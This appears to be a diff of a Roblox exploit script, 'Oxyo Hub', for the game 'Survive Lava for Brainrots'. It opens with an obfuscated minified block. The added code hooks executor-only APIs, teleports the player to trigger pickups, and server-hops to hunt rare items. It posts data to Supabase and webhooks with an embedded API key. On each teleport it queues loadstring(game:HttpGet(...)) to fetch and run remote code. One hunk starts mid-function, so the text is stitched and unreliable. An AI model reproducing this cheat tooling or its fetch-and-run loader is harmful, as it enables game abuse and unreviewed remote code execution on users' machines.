"_"   .. tostring(v0.LocalPlayer.UserId) ;local v1124,v1125,v1126=nil,false,0;local function v1127() if v1125 then return;end v1125=true;pcall(function() local v1923=v1102("POST","user_counts","",{uc_key=v1123,t=os.time()});if (v1923~=nil) then v1126=tick();end end);v1124=task.spawn(function() while v1125 do task.wait(15);pcall(function() local v2314=v1102("POST","user_counts","",{uc_key=v1123,t=os.time()});if (v2314~=nil) then v1126=tick();else task.wait(3);local v2473=v1102("POST","user_counts","",{uc_key=v1123,t=os.time()});if (v2473~=nil) then v1126=tick();end end end);end end);end local function v1128() v1125=false;if v1124 then pcall(task.cancel,v1124);v1124=nil;end pcall(function() v1102("DELETE","user_counts","uc_key=eq."   .. v1123 ,nil);end);end local function v1129() local v1577=v1102("GET","user_counts","select=*",nil,5);if (type(v1577)~="table") then return 0;end local v1578,v1579=os.time(),0;for v1924,v1925 in ipairs(v1577) do if ((type(v1925)=="table") and ((v1578-(v1925.t or 0))<=120)) then v1579+=1 end end return v1579;end local v1130,v1131,v1132=nil,0,25;local function v1133(v1580) if ( not v1580 and v1130 and ((tick() -v1131)<v1132)) then return v1130;end local v1581,v1582={},{};for v1926=1,6 do local v1927="https://games.roblox.com/v1/games/"   .. game.PlaceId   .. "/servers/Public?sortOrder=Asc&limit=100" ;if (v1582~="") then v1927=v1927   .. "&cursor="   .. v1582 ;end local v1928,v1929=pcall(function() return game:HttpGet(v1927);end);if ( not v1928 or  not v1929 or (v1929=="")) then break;end local v1930,v1931=pcall(function() return game:GetService("HttpService"):JSONDecode(v1929);end);if ( not v1930 or  not v1931 or  not v1931.data) then break;end for v2151,v2152 in ipairs(v1931.data) do if v2152.id then v1581[v2152.id]=true;end end if (v1931.nextPageCursor and (v1931.nextPageCursor~="")) then v1582=v1931.nextPageCursor;task.wait(0.08);else break;end end v1130=v1581;v1131=tick();return v1581;end local function v1134(v1583) task.spawn(function() pcall(function() v1105(v1583);end);end);return true;end function v11(v1584,v1585,v1586,v1587,v1588) local v1589=v1106(7);if (type(v1589)~="table") then return nil,nil;end local v1590=v1133();local v1591=os.time();local v1592=(v1585 and v1585:lower()) or nil ;local v1593=(v1587 and v1587:lower()) or nil ;local v1594=(v1588 and v1588:lower()) or nil ;local function v1595(v1932) return (v1932 or ""):lower():gsub("%s+",""):gsub("[^%a%d]","");end local v1596=(v1584 or ""):lower();local v1597=v1595(v1584);local v1598=(v1586 or ""):lower();local v1599=v1595(v1586);local function v1600(v1933) if ( not v1933 or (v1933=="")) then return false;end local v1934=v1933:lower();local v1935=v1595(v1933);if ((v1934==v1596) or (v1934==v1598)) then return true;end if ((v1935==v1597) or (v1935==v1599)) then return true;end if ((v1597~="") and (v1935:find(v1597,1,true) or v1597:find(v1935,1,true))) then return true;end if ((v1599~="") and (v1935:find(v1599,1,true) or v1599:find(v1935,1,true))) then return true;end return false;end local function v1601(v1936) if  not v1593 then return true;end if  not v1936 then return false;end return v1936:lower()==v1593 ;end local function v1602(v1937) if  not v1594 then return true;end if (type(v1937)~="table") then return false;end for v2153,v2154 in ipairs(v1937) do if (tostring(v2154):lower()==v1594) then return true;end end return false;end local v1603={};for v1938,v1939 in pairs(v1589) do if (v1938==v1099) then continue;end if (type(v1939)~="table") then continue;end if ((v1591-(v1939.t or 0))>45) then v1134(v1938);continue;end local v1940=v1939.j;if ( not v1940 or  not v1590[v1940]) then v1134(v1938);continue;end if (type(v1939.b)~="table") then continue;end for v2155,v2156 in ipairs(v1939.b) do if  not v1600(v2156.n) then continue;end local v2157=(v2156.r and v2156.r:lower()) or "" ;if (v1592 and (v2157~=v1592)) then continue;end if  not v1601(v2156.m) then continue;end if  not v1602(v2156.t) then continue;end local v2158=0;if (v2156.m and (v2156.m~="")) then v2158+=10 end if ((type(v2156.t)=="table") and ( #v2156.t>0)) then v2158+=10 end v2158+=math.max(0,45 -(v1591-(v1939.t or 0)) ) table.insert(v1603,{job=v1940,entry=v2156,score=v2158});end end if ( #v1603==0) then return nil,nil;end table.sort(v1603,function(v1941,v1942) return v1941.score>v1942.score ;end);return v1603[1].job,v1603[1].entry;end task.delay(2,function() if  not v1095() then v1127();end end);task.delay(5,function() if v1095() then pcall(function() v38:Notify({Title="⛔ Private Server",Content="Reporter & webhooks are disabled.\nJoin a public server to use the Finder.",Duration=8,Image=4483362458});end);return;end v1121();end);game:GetService("Players").LocalPlayer.AncestryChanged:Connect(function() pcall(v1122);pcall(v1128);end);v63:CreateSection("Status");local v1135=v63:CreateParagraph({Title="👥 Active Users",Content="Loading..."});task.spawn(function() while true do pcall(function() if  not v1101 then v1135:Set({Title="👥 HTTP N/A",Content="Executor doesn't support HTTP requests."});return;end local v2159=v1102("GET","user_counts","select=*",nil,6);if (type(v2159)~="table") then v1135:Set({Title="👥 DB Unreachable",Content="Supabase not responding. Check project settings."});return;end local v2160,v2161=os.time(),0;for v2316,v2317 in ipairs(v2159) do if ((type(v2317)=="table") and ((v2160-(v2317.t or 0))<=300)) then v2161+=1 end end v1135:Set({Title="👥 "   .. v2161   .. " users online" ,Content="Players currently running Oxyo Hub in this game."});end);task.wait(20);end end);v63:CreateButton({Name="📊 Active Reporters",Callback=function() task.spawn(function() if  not v1101 then v38:Notify({Title="❌ No HTTP",Content="Executor doesn't support HTTP — Supabase unavailable.",Duration=5,Image=4483362458});return;end v1109=0;v1110=false;local v1943=v1102("GET","servers","select=*",nil,8);if (v1943==nil) then v38:Notify({Title="❌ Supabase Error",Content="Supabase didn't respond.\nCheck your project settings.",Duration=6,Image=4483362458});return;end if ((type(v1943)~="table") or ( #v1943==0)) then v38:Notify({Title="📊 0 Servers Online",Content="Supabase reachable but no reporters yet.\nMake sure Reporter toggle is ON.",Duration=5,Image=4483362458});return;end local v1944=os.time();local v1945=0;local v1946=0;for v2162,v2163 in ipairs(v1943) do if ((type(v2163)=="table") and ((v1944-(v2163.t or 0))<=60)) then(v1945+=1)(v1946+=v2163.c ) or 0 end end v38:Notify({Title="📊 "   .. v1945   .. " Servers Online" ,Content=v1946   .. " brainrots being tracked right now" ,Duration=5,Image=4483362458});end);end});v63:CreateSection("Hunter");local v1136,v1137,v1138,v1139="",nil,nil,nil;v63:CreateInput({Name="Brainrot Name",PlaceholderText="e.g. Chimpanzini, Titan...",RemoveTextAfterFocusLost=false,Callback=function(v1604) v1136=v1604:gsub("^%s+",""):gsub("%s+$","");end});v63:CreateDropdown({Name="Rarity Filter",Options={"Any","Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly"},CurrentOption={"Any"},MultipleOptions=false,Callback=function(v1605) v1137=((v1605=="Any") and nil) or v1605 ;end});v63:CreateDropdown({Name="Mutation Filter",Options={"Any","Gold","Emerald","Diamond","Bloodmoon","Rainbow","Cheese","Aqua"},CurrentOption={"Any"},MultipleOptions=false,Flag="FinderMutation",Callback=function(v1606) local v1607=((type(v1606)=="table") and v1606[1]) or v1606 ;v1138=((v1607=="Any") and nil) or v1607 ;end});v63:CreateDropdown({Name="Trait Filter",Options={"Any","MoonGlow","Magma","Storm","Slime","Volcano","Shamrock","Ice"},CurrentOption={"Any"},MultipleOptions=false,Flag="FinderTrait",Callback=function(v1608) local v1609=((type(v1608)=="table") and v1608[1]) or v1608 ;v1139=((v1609=="Any") and nil) or v1609 ;end});v63:CreateButton({Name="🔍 Search & Hop",Callback=function() if (v1136=="") then v38:Notify({Title="Finder",Content="Enter a brainrot name first!",Duration=3,Image=4483362458});return;end local v1610=v1136;if v1137 then v1610=v1610   .. " | "   .. v1137 ;end if v1138 then v1610=v1610   .. " | "   .. v1138 ;end if v1139 then v1610=v1610   .. " | Trait:"   .. v1139 ;end v38:Notify({Title="🔍 Searching...",Content=v1610,Duration=3,Image=4483362458});task.spawn(function() local v1947,v1948=v11(v1136,v1137,nil,v1138,v1139);if  not v1947 then local v2318="";if (v1138 or v1139) then v2318="\nTip: Try setting filters to 'Any' to find normal variants.";end v38:Notify({Title="Not Found â",Content="No server has "   .. v1610   .. " right now.\nMake sure others have Reporter ON!"   .. v2318 ,Duration=7,Image=4483362458});return;end local v1949=(v1948.m and (" ["   .. v1948.m   .. "]")) or " [Normal]" ;local v1950="";if ((type(v1948.t)=="table") and ( #v1948.t>0)) then v1950=" {"   .. table.concat(v1948.t,"+")   .. "}" ;end v38:Notify({Title="Found! ð¯",Content=v1948.n   .. v1949   .. v1950   .. "\n"   .. (v1948.r or "?")   .. "\nHopping in 2s..." ,Duration=5,Image=4483362458});task.wait(2);if v23() then return;end v114.hop(v1947);end);end});v63:CreateSection("Quick Hunt");for v1611,v1612 in ipairs({"Godly","Celestial","Secret","Mythic"}) do v63:CreateButton({Name="â¡ Any "   .. v1612 ,Callback=function() v38:Notify({Title="ð Hunting "   .. v1612   .. "..." ,Content="Scanning & verifying servers...",Duration=3,Image=4483362458});task.spawn(function() local v2164=v1114("GET","servers","select=*",nil,7);if (type(v2164)~="table") then v38:Notify({Title="Not Found",Content="No reporters active.",Duration=4,Image=4483362458});return;end local v2165=v1133(true);local v2166=os.time();local v2167=v1612:lower();local v2168={};for v2319,v2320 in ipairs(v2164) do if (type(v2320)~="table") then continue;end if ((v2166-(v2320.t or 0))>45) then v1134(v2320.job_key or "" );continue;end local v2321=v2320.job_id;if ( not v2321 or  not v2165[v2321]) then v1134(v2320.job_key or "" );continue;end if (type(v2320.b)~="table") then continue;end for v2409,v2410 in ipairs(v2320.b) do if (v2410.r and (v2410.r:lower()==v2167)) then local v2519=0;if (v2410.m and (v2410.m~="")) then v2519+=20 end if ((type(v2410.t)=="table") and ( #v2410.t>0)) then v2519+=15 end v2519+=math.max(0,45 -(v2166-(v2320.t or 0)) ) table.insert(v2168,{job=v2321,b=v2410,score=v2519});end end end if ( #v2168==0) then v38:Notify({Title="Not Found â",Content="No verified public server has "   .. v1612   .. " right now." ,Duration=5,Image=4483362458});return;end table.sort(v2168,function(v2322,v2323) return v2322.score>v2323.score ;end);local v2169=v2168[1];local v2170=v2169.b;local v2171=(v2170.m and (" ["   .. v2170.m   .. "]")) or "" ;local v2172="";if ((type(v2170.t)=="table") and ( #v2170.t>0)) then v2172=" {"   .. table.concat(v2170.t,"+")   .. "}" ;end v38:Notify({Title="Found "   .. v1612   .. "! ð¯" ,Content=v2170.n   .. v2171   .. v2172   .. "\nHopping in 2s..." ,Duration=5,Image=4483362458});task.wait(2);if v23() then return;end v114.hop(v2169.job);end);end});end end)();if ((getgenv().OxyoAutoHopCoin==true) and  not getgenv().OxyoHopStopped) then v46.autoHopCoinEnabled=true;v46.autoCoinEnabled=true;v72();v130();task.spawn(function() v38:Notify({Title="Auto Hop",Content="Checking for Coin Rain...",Duration=3,Image=4483362458});local v1951,v1952=v78(15);if ( not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped) then return;end if (v1951=="active") then if ((v1952 or 0)<10) then v38:Notify({Title="Auto Hop",Content="Coin Rain almost over — hopping...",Duration=2,Image=4483362458});task.wait(1);if ( not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped) then return;end task.spawn(v116);else v38:Notify({Title="Coin Rain!",Content="Active! Farming now...",Duration=3,Image=4483362458});v111=true;v46.coinEventDuration=v1952 or 60 ;v113();end elseif (v1951=="queued") then v38:Notify({Title="Auto Hop",Content="Coin Rain in "   .. tostring(v1952)   .. "s — waiting..." ,Duration=4,Image=4483362458});task.spawn(function() task.wait(v1952 + 2 );if ( not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped) then return;end if (v46.autoHopCoinEnabled and  not v105.isActive()) then v111=true;v46.coinEventDuration=60;v113();end end);else v38:Notify({Title="Auto Hop",Content="No Coin Rain — searching webhook...",Duration=2,Image=4483362458});local v2475=v92("coin",90);if v2475 then v38:Notify({Title="🪙 Webhook Hop",Content="Coin Rain found — hopping...",Duration=4,Image=4483362458});task.wait(1);if ( not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped) then return;end v114.hop(v2475);else task.wait(1);if ( not getgenv().OxyoAutoHopCoin or getgenv().OxyoHopStopped) then return;end task.spawn(v116);end end end);end if ((getgenv().OxyoAutoHopGodly==true) and  not getgenv().OxyoHopGodlyStopped) then v46.autoHopGodlyEnabled=true;v72();v130();v46.autoHopGodlyThread=task.spawn(function() v93("Godly","OxyoAutoHopGodly","OxyoHopGodlyStopped");end);end if ((getgenv().OxyoAutoHopCel==true) and  not getgenv().OxyoHopCelStopped) then v46.autoHopCelEnabled=true;v72();v130();v46.autoHopCelThread=task.spawn(function() v93("Celestial","OxyoAutoHopCel","OxyoHopCelStopped");end);end if ((getgenv().OxyoAutoHopFrag==true) and  not getgenv().OxyoHopFragStopped) then v46.autoHopFragEnabled=true;v72();v130();v46.autoHopFragThread=task.spawn(function() v94("OxyoAutoHopFrag","OxyoHopFragStopped");end);end if ((getgenv().OxyoWWHCoin==true) and  not getgenv().OxyoWWHCoinStop) then v72();v130();v46.wwhCoinThread=task.spawn(function() v124("coin","OxyoWWHCoin","OxyoWWHCoinStop","Coin Rain","🪙");end);end if ((getgenv().OxyoWWHGodly==true) and  not getgenv().OxyoWWHGodlyStop) then v72();v130();v46.wwhGodlyThread=task.spawn(function() v124("godly","OxyoWWHGodly","OxyoWWHGodlyStop","Godly","👑");end);end if ((getgenv().OxyoWWHCel==true) and  not getgenv().OxyoWWHCelStop) then v72();v130();v46.wwhCelThread=task.spawn(function() v124("celest","OxyoWWHCel","OxyoWWHCelStop","Celestial","🌌");end);end if ((getgenv().OxyoWWHFrag==true) and  not getgenv().OxyoWWHFragStop) then v72();v130();v46.wwhFragThread=task.spawn(function() v124("frag","OxyoWWHFrag","OxyoWWHFragStop","Fragments","🔷");end);end if ((getgenv().OxyoWWHBR==true) and  not getgenv().OxyoWWHBRStop) then v72();v130();v46.wwhBRThread=task.spawn(function() v125("OxyoWWHBR","OxyoWWHBRStop");end);end print("Oxyo Hub Premium loaded.");end)();
+local function _safeWFC(parent, name, timeout)
+    if not parent then return nil end
+    local ok, result = pcall(function() return parent:WaitForChild(name, timeout or 5) end)
+    return ok and result or nil
+end
+
+local _wsDescCache = {}
+local _wsDescCacheTime = 0
+local function _getDescCached(timeout)
+    timeout = timeout or 1.5
+    local now = tick()
+    if now - _wsDescCacheTime > math.max(timeout, 2.5) then
+        _wsDescCache = workspace:GetDescendants()
+        _wsDescCacheTime = now
+    end
+    return _wsDescCache
+end
+
+local function _getChar()
+    local p = Players.LocalPlayer
+    return p and p.Character
+end
+local function _getRoot()
+    local c = _getChar()
+    return c and c:FindFirstChild("HumanoidRootPart")
+end
+local function _getHum()
+    local c = _getChar()
+    return c and c:FindFirstChildOfClass("Humanoid")
+end
+
+        local body = HttpService:JSONEncode(item.payload)
+        return _httpReq({
+            Url     = item.url,
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = body,
+        })
+    end)
+    if not ok or not res then return false, "pcall_error" end
+    local status = tonumber(res.StatusCode or res.status) or 0
+    if status == 200 or status == 204 then return true, "ok" end
+    if status == 429 then
+        local retryAfter = _HOOK_MIN_GAP
+        pcall(function()
+            local decoded = game:GetService("HttpService"):JSONDecode(res.Body or "{}")
+            local ra = tonumber(decoded.retry_after) or _HOOK_MIN_GAP
+            retryAfter = ra < 1 and (ra * 1000) or ra
+        end)
+        retryAfter = math.clamp(retryAfter, _HOOK_MIN_GAP, 60)
+        task.wait(retryAfter)
+        return false, "rate_limited"
+    end
+    return false, "http_" .. tostring(status)
+end
+local function _processQueue(qkey)
+    if _qBusy[qkey] then return end
+    _qBusy[qkey] = true
+    task.spawn(function()
+        while #_queues[qkey] > 0 do
+            local item = table.remove(_queues[qkey], 1)
+            local gap  = _HOOK_MIN_GAP - (tick() - _qLast[qkey])
+            if gap > 0 then task.wait(gap) end
+            _qLast[qkey] = tick()
+            local sent, reason = false, "unknown"
+            for attempt = 1, 3 do
+                sent, reason = _sendOnce(item)
+                if sent then break end
+                if reason == "stale" or reason == "no_http" then break end
+                if attempt < 3 then
+                    task.wait(reason == "rate_limited" and 0 or math.min(3 * 2^(attempt - 1), 12))
+                end
+            end
+        end
+        _qBusy[qkey] = false
+    end)
+end
+local function _fireHook(url, payload, qkey)
+    table.insert(_queues[qkey], {
+        url      = url,
+        payload  = payload,
+        queuedAt = tick(),
+    })
+    _processQueue(qkey)
+end
+sendWebhook = function(title, description, color)
+    if not game.JobId or game.JobId == "" then return end
+    do
+        local ok, isPriv = true, false
+        if ok and isPriv then return end
+    end
+    local key = title .. "|" .. description
+    if _webhookSent[key] then return end
+    _webhookSent[key] = true
+    task.delay(90, function() _webhookSent[key] = nil end)
+    table.insert(_webhookHistory, 1, {
+        time        = os.date("%H:%M:%S"),
+        title       = title,
+        description = description,
+        color       = color or 0x7B2FBE,
+        category    = getWebhookCategory(title),
+        serverLink  = getServerLink(),
+    })
+    if #_webhookHistory > 50 then table.remove(_webhookHistory) end
+    task.spawn(function()
+        local waited = 0
+        while not _webhookReady and waited < 5 do
+            task.wait(0.25)
+            waited = waited + 0.25
+        end
+        if not _webhookReady then return end
+        if WEBHOOK_URL ~= "" then
+            _fireHook(WEBHOOK_URL, buildOxyoEmbed(title, description, color), "oxyo")
+        end
+    end)
+end
+end)()
+if not getgenv then getgenv = function() return _G end end
+if getgenv().OxyoHopStopped == true then
+    getgenv().OxyoHopStopped      = false
+    getgenv().OxyoAutoHopCoin     = false
+    getgenv().OxyoHopGodlyStopped = false
+    getgenv().OxyoAutoHopGodly    = false
+    getgenv().OxyoHopCelStopped   = false
+    getgenv().OxyoAutoHopCel      = false
+    getgenv().OxyoHopFragStopped  = false
+    getgenv().OxyoAutoHopFrag     = false
+    getgenv().OxyoHopAquaStopped  = false
+    getgenv().OxyoAutoHopAqua     = false
+end
+local _CURRENT_VERSION, _versionKilled = "2", false
+local _SB_VER_URL = "https://lywfxgkkpiyxaydwqyte.supabase.co/rest/v1/cfg?select=value&key=eq.version"
+local _SB_VER_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5d2Z4Z2trcGl5eGF5ZHdxeXRlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MDA3NzcsImV4cCI6MjA5MTE3Njc3N30.mSs9Vko1yDVWSS-7-CJJUBNm36udqyalNxg0q6ZOmxM"
+pcall(function()
+    local _req = (typeof(request)        == "function" and request)
+              or (typeof(http_request)   == "function" and http_request)
+              or (typeof(http)           == "table" and typeof(http.request)   == "function" and http.request)
+              or (typeof(syn)            == "table" and typeof(syn.request)    == "function" and syn.request)
+              or (typeof(fluxus)         == "table" and typeof(fluxus.request) == "function" and fluxus.request)
+    if not _req then return end
+    local res = _req({ Url = _SB_VER_URL, Method = "GET", Headers = { ["apikey"] = _SB_VER_KEY, ["Authorization"] = "Bearer " .. _SB_VER_KEY } })
+    if not res or not res.Body then return end
+    local ok, decoded = pcall(function()
+        return game:GetService("HttpService"):JSONDecode(res.Body)
+    end)
+    if not ok then return end
+    local serverVer = tostring((type(decoded)=="table" and decoded[1] and decoded[1].value) or "")
+    if serverVer ~= "" and serverVer ~= _CURRENT_VERSION then
+        _versionKilled = true
+        pcall(function()
+            local sGui = Instance.new("ScreenGui")
+            sGui.Name = "OxyoUpdateGui"
+            sGui.ResetOnSpawn = false
+            sGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+            pcall(function() sGui.Parent = game:GetService("CoreGui") end)
+            local frame = Instance.new("Frame", sGui)
+            frame.Size = UDim2.new(0, 400, 0, 110)
+            frame.Position = UDim2.new(0.5, -200, 0, 24)
+            frame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+            frame.BorderSizePixel = 0
+            Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+            local accent = Instance.new("Frame", frame)
+            accent.Size = UDim2.new(1, 0, 0, 3)
+            accent.BackgroundColor3 = Color3.fromRGB(0, 210, 255)
+            accent.BorderSizePixel = 0
+            Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 12)
+            local lbl = Instance.new("TextLabel", frame)
+            lbl.Size = UDim2.new(1, -24, 1, 0)
+            lbl.Position = UDim2.new(0, 12, 0, 0)
+            lbl.BackgroundTransparency = 1
+            lbl.Text = "🔄  Oxyo Hub — Update Required\nA new version is available. Please re-execute the script."
+            lbl.TextColor3 = Color3.fromRGB(220, 220, 220)
+            lbl.Font = Enum.Font.GothamMedium
+            lbl.TextSize = 14
+            lbl.TextWrapped = true
+            lbl.TextXAlignment = Enum.TextXAlignment.Left
+            task.delay(10, function() pcall(function() sGui:Destroy() end) end)
+        end)
+    end
+end)
+if _versionKilled then return end
+if getgenv().OxyoHubLoaded then
+    return
+end
+getgenv().OxyoHubLoaded = true
+task.spawn(function()
+    task.wait(10)
+    while true do
+        task.wait(60)
+        pcall(function()
+            if not _httpReq then return end
+            local res = _httpReq({ Url = _SB_VER_URL, Method = "GET", Headers = { ["apikey"] = _SB_VER_KEY, ["Authorization"] = "Bearer " .. _SB_VER_KEY } })
+            if not res or not res.Body then return end
+            local ok, ver = pcall(function()
+                return game:GetService("HttpService"):JSONDecode(res.Body)
+            end)
+            if not ok then return end
+            local _verStr = tostring((type(ver)=="table" and ver[1] and ver[1].value) or "")
+            if _verStr ~= "" and _verStr ~= _CURRENT_VERSION then
+                pcall(function()
+                    Rayfield:Notify({
+                        Title    = "🔄 Update Available",
+                        Content  = "A new version of Oxyo Hub is available.\nRe-execute after your current session.",
+                        Duration = 10,
+                        Image    = 4483362458,
+                    })
+                end)
+            end
+        end)
+    end
+end)
+if not setclipboard then
+    setclipboard = function() end
+end
+if not rconsoleprint then
+    rconsoleprint = function() end
+end
+if not isreadonly then
+    isreadonly = function() return false end
+end
+if not setreadonly then
+    setreadonly = function() end
+end
+if not newcclosure then
+    newcclosure = function(f) return f end
+end
+if not getnamecallmethod then
+    getnamecallmethod = function() return "" end
+end
+if not getrawmetatable then
+    getrawmetatable = function(o) return getmetatable(o) end
+end
+local _fireprox = (typeof(fireproximityprompt) == "function" and fireproximityprompt) or function(prompt)
+    if not prompt or not prompt.Parent then return end
+    local root = Players.LocalPlayer.Character
+    root = root and root:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+    local part = prompt.Parent
+    if not part:IsA("BasePart") then
+        part = part:FindFirstChildWhichIsA("BasePart")
+            or (part.Parent and part.Parent:FindFirstChildWhichIsA("BasePart"))
+    end
+    local targetPos
+    if part and part:IsA("BasePart") then
+        targetPos = part.Position + Vector3.new(0, 3, 0)
+    elseif prompt.Parent:IsA("Attachment") then
+        targetPos = prompt.Parent.WorldPosition + Vector3.new(0, 3, 0)
+    else
+        local wp = pcall(function() return prompt.Parent.Position end)
+        if wp then targetPos = prompt.Parent.Position + Vector3.new(0, 3, 0)
+        else return end
+    end
+    pcall(function() root.CFrame = CFrame.new(targetPos) end)
+    task.wait(0.12)
+    local fired = pcall(function()
+        game:GetService("ProximityPromptService"):PromptTriggered(prompt, Players.LocalPlayer)
+    end)
+    if not fired then
+        pcall(function()
+            local ev = ReplicatedStorage:FindFirstChild("Events")
+            local interact = ev and (
+                ev:FindFirstChild("Interact") or
+                ev:FindFirstChild("ProximityPrompt") or
+                ev:FindFirstChild("Trigger") or
+                ev:FindFirstChild("PickUp") or
+                ev:FindFirstChild("Collect")
+            )
+            if interact then interact:FireServer(prompt) end
+        end)
+    end
+    task.wait(0.08)
+end
+local _firetouchinterest = (typeof(firetouchinterest) == "function" and firetouchinterest) or function(part1, part2, touchType)
+    if not part1 or not part2 then return end
+    if touchType == 0 then
+        local old = part1.CFrame
+        local moved = false
+        moved = pcall(function() part1.CFrame = CFrame.new(part2.Position + Vector3.new(0, 0.5, 0)) end)
+        if not moved then
+            pcall(function() part1.Position = part2.Position + Vector3.new(0, 0.5, 0) end)
+        end
+        task.wait(0.08)
+        pcall(function() part1.CFrame = old end)
+    elseif touchType == 1 then
+        local old = part1.CFrame
+        pcall(function() part1.CFrame = CFrame.new(part2.Position + Vector3.new(0, 100, 0)) end)
+        task.wait(0.05)
+        pcall(function() part1.CFrame = old end)
+    end
+end
+local _hasAdvancedAPI = (typeof(getrawmetatable) == "function")
+    and (typeof(setreadonly) == "function")
+    and (typeof(newcclosure) == "function")
+    and (typeof(getnamecallmethod) == "function")
+    and (pcall(function() return getrawmetatable(game) end))
+local AUTO_EXEC_URL = "https://raw.githubusercontent.com/idcidc1234xdlol-bit/lava/refs/heads/main/lava"
+local HttpService = game:GetService("HttpService")
+local _hopPlaceId = game.PlaceId
+local _hopJobId   = game.JobId
+local function isAnyHopStopped()
+    if getgenv().OxyoAutoHopCoin  and getgenv().OxyoHopStopped      then return true end
+    if getgenv().OxyoAutoHopGodly and getgenv().OxyoHopGodlyStopped then return true end
+    if getgenv().OxyoAutoHopCel   and getgenv().OxyoHopCelStopped   then return true end
+    if getgenv().OxyoAutoHopFrag  and getgenv().OxyoHopFragStopped  then return true end
+    if getgenv().OxyoAutoHopAqua  and getgenv().OxyoHopAquaStopped  then return true end
+    return false
+end
+local function isAnyHopActive()
+    return getgenv().OxyoAutoHopCoin
+        or getgenv().OxyoAutoHopGodly
+        or getgenv().OxyoAutoHopCel
+        or getgenv().OxyoAutoHopFrag
+        or getgenv().OxyoAutoHopAqua
+end
+local function _hopGuard()
+    if getgenv().OxyoManualHop == true then return false end
+    return isAnyHopStopped() or not isAnyHopActive()
+end
+local function ServerHop()
+    if _hopGuard() then return end
+    local servers = {}
+    local cursor  = ""
+    for _ = 1, 8 do
+        if _hopGuard() then return end
+        local url = "https://games.roblox.com/v1/games/" .. tostring(_hopPlaceId)
+                 .. "/servers/Public?sortOrder=Asc&limit=100"
+        if cursor ~= "" then url = url .. "&cursor=" .. cursor end
+        local ok, result = pcall(function() return game:HttpGet(url) end)
+        if not ok then task.wait(3) break end
+        local data
+        ok, data = pcall(function() return HttpService:JSONDecode(result) end)
+        if not ok or not data or not data.data then task.wait(2) break end
+        for _, sv in pairs(data.data) do
+            if sv.id ~= _hopJobId and sv.playing < sv.maxPlayers then
+                local isDead  = getgenv().OxyoDeadServers and getgenv().OxyoDeadServers[sv.id]
+                local fpsOk   = not sv.fps or sv.fps >= 10
+                local notGhost = not sv.playing or sv.playing >= 0
+                if not isDead and fpsOk and notGhost then
+                    table.insert(servers, sv.id)
+                end
+            end
+        end
+        if #servers > 0 then break end
+        if data.nextPageCursor then
+            cursor = data.nextPageCursor
+            task.wait(0.3)
+        else
+            break
+        end
+    end
+    if _hopGuard() then return end
+    if #servers == 0 then
+        local waitTime = math.random(5, 10)
+        for i = 1, waitTime * 4 do
+            task.wait(0.25)
+            if _hopGuard() then return end
+        end
+        task.spawn(ServerHop)
+        return
+    end
+    local function queueExec()
+        if not getgenv().OxyoExecQueued then
+            getgenv().OxyoExecQueued = true
+            local _qs = 'loadstring(game:HttpGet("' .. AUTO_EXEC_URL .. '"))()'
+            pcall(function() if typeof(queue_on_teleport) == "function" then queue_on_teleport(_qs) end end)
+            pcall(function() if typeof(syn) == "table" and typeof(syn.queue_on_teleport) == "function" then syn.queue_on_teleport(_qs) end end)
+            pcall(function() if typeof(fluxus) == "table" and typeof(fluxus.queue_on_teleport) == "function" then fluxus.queue_on_teleport(_qs) end end)
+        end
+    end
+    for _ = 1, math.min(#servers, 5) do
+        if _hopGuard() then return end
+        local idx    = math.random(1, #servers)
+        local picked = servers[idx]
+        table.remove(servers, idx)
+        queueExec()
+        pcall(function() getgenv().OxyoHubLoaded = false end)
+        local tpOk = false
+        for _attempt = 1, 3 do
+            tpOk = pcall(function()
+                TeleportService:TeleportToPlaceInstance(_hopPlaceId, picked, Players.LocalPlayer)
+            end)
+            if tpOk then
+                task.delay(10, function() getgenv().OxyoExecQueued = false end)
+                return
+            end
+            task.wait(1.5)
+        end
+        if getgenv().OxyoDeadServers then getgenv().OxyoDeadServers[picked] = true end
+        for i = 1, math.random(2, 4) * 4 do
+            task.wait(0.25)
+            if _hopGuard() then return end
+        end
+    end
+    if _hopGuard() or not isAnyHopActive() then return end
+    local waitTime = math.random(5, 10)
+    for i = 1, waitTime * 4 do
+        task.wait(0.25)
+        if _hopGuard() then return end
+    end
+    task.spawn(ServerHop)
+end
+local function smartHop()
+    task.spawn(ServerHop)
+end
+local function smartHopGeneric(enabledKey, stoppedKey)
+    if enabledKey and not getgenv()[enabledKey] then return end
+    if stoppedKey and getgenv()[stoppedKey] then return end
+    if _hopGuard() then return end
+    task.spawn(ServerHop)
+end
+local function doTeleport(serverId)
+    if _hopGuard() then return end
+    if serverId and serverId ~= _hopJobId then
+        if not getgenv().OxyoExecQueued then
+            getgenv().OxyoExecQueued = true
+            local _qs = 'loadstring(game:HttpGet("' .. AUTO_EXEC_URL .. '"))()'
+            pcall(function() if typeof(queue_on_teleport) == "function" then queue_on_teleport(_qs) end end)
+            pcall(function() if typeof(syn) == "table" and typeof(syn.queue_on_teleport) == "function" then syn.queue_on_teleport(_qs) end end)
+            pcall(function() if typeof(fluxus) == "table" and typeof(fluxus.queue_on_teleport) == "function" then fluxus.queue_on_teleport(_qs) end end)
+        end
+        pcall(function() getgenv().OxyoHubLoaded = false end)
+        local tpDone = pcall(function()
+            TeleportService:TeleportToPlaceInstance(_hopPlaceId, serverId, Players.LocalPlayer)
+        end)
+        if tpDone then task.delay(10, function() getgenv().OxyoExecQueued = false end) end
+    else
+        task.spawn(ServerHop)
+    end
+end
+getgenv().OxyoExecQueued     = false
+getgenv().OxyoDeadServers    = getgenv().OxyoDeadServers    or {}
+getgenv().OxyoVisitedServers = getgenv().OxyoVisitedServers or {}
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+local Window = Rayfield:CreateWindow({
+    Name            = "Oxyo | Survive Lava for Brainrots",
+    LoadingTitle    = "Loading Oxyo...",
